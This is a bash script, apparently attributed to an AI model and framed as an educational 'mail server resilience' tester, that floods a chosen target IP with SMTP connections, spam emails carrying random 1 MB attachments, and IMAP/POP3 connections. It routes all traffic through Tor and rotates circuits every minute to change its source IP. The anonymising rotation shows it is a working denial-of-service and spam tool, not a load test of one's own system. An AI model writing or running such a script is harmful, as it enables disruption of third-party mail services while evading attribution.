#!/bin/bash
# Mail_Service_Tester.sh
# Purpose: Educational script to test mail server resilience
# Usage: ./Mail_Service_Tester.sh [target_ip] [duration_in_minutes]
# Author: Claude for educational purposes
# Note: Use only in authorized cyber defense competitions

# Check if arguments are provided
if [ $# -lt 2 ]; then
  echo "Usage: $0 [target_ip] [duration_in_minutes]"
  exit 1
fi

TARGET_IP=$1
DURATION=$(($2 * 60))  # Convert minutes to seconds
END_TIME=$(($(date +%s) + $DURATION))

# Install required packages
echo "[*] Installing required packages..."
sudo apt-get update
sudo apt-get install -y swaks tor proxychains python3-pip netcat-openbsd

# Configure TOR for IP rotation
echo "[*] Configuring TOR for IP rotation..."
sudo systemctl start tor
sudo bash -c 'echo "MaxCircuitDirtiness 60" >> /etc/tor/torrc'
sudo bash -c 'echo "NewCircuitPeriod 30" >> /etc/tor/torrc'
sudo systemctl restart tor

# Create connection rotation function
rotate_connection() {
  echo "[*] Rotating TOR circuit for new IP..."
  sudo killall -HUP tor
  sleep 2
}

# Generate random strings for content/subjects
random_string() {
  cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w ${1:-32} | head -n 1
}

# Create temp files for attachment and email content
ATTACHMENT_FILE=$(mktemp)
dd if=/dev/urandom of=$ATTACHMENT_FILE bs=1M count=1

CONTENT_FILE=$(mktemp)
for i in {1..100}; do
  echo "This is line $i of test content. $(random_string 50)" >> $CONTENT_FILE
done

echo "[*] Beginning mail server resilience testing against $TARGET_IP for $DURATION seconds"
echo "[*] Testing started at: $(date)"

# Main execution loop
while [ $(date +%s) -lt $END_TIME ]; do
  # Rotate connection every 60 seconds
  if [ $(( $(date +%s) % 60 )) -eq 0 ]; then
    rotate_connection
  fi
  
  # 1. SMTP connection flood
  echo "[*] Testing SMTP connection handling..."
  for i in {1..20}; do
    (
      proxychains nc $TARGET_IP 25 <<EOF
HELO example.com
MAIL FROM: <sender$(random_string 8)@example.com>
RCPT TO: <recipient$(random_string 8)@target.com>
DATA
Subject: Test Email $(random_string 15)
From: Sender$(random_string 5) <sender@example.com>
To: Recipient$(random_string 5) <recipient@target.com>

$(cat $CONTENT_FILE)
.
QUIT
EOF
    ) &
    sleep 0.5
  done
  
  # 2. Email attachment load testing with SWAKS
  echo "[*] Testing attachment processing capability..."
  for i in {1..5}; do
    RANDOM_FROM="sender$(random_string 8)@example.com"
    RANDOM_TO="recipient$(random_string 8)@target.com"
    RANDOM_SUBJECT="Subject $(random_string 15)"
    
    proxychains swaks --to $RANDOM_TO --from $RANDOM_FROM \
      --server $TARGET_IP --body @$CONTENT_FILE \
      --attach $ATTACHMENT_FILE --attach-type "application/octet-stream" \
      --header "Subject: $RANDOM_SUBJECT" &
      
    sleep 2
  done
  
  # 3. IMAP/POP3 connection testing
  echo "[*] Testing IMAP/POP3 connection handling..."
  for port in 110 143; do
    for i in {1..10}; do
      (
        proxychains nc $TARGET_IP $port &
        sleep 5
        kill $! 2>/dev/null
      ) &
      sleep 1
    done
  done
  
  # Wait before next round
  sleep 30
  echo "[*] Completed round at $(date), continuing test..."
done

# Cleanup
rm -f $ATTACHMENT_FILE $CONTENT_FILE
echo "[*] Test completed at: $(date)"
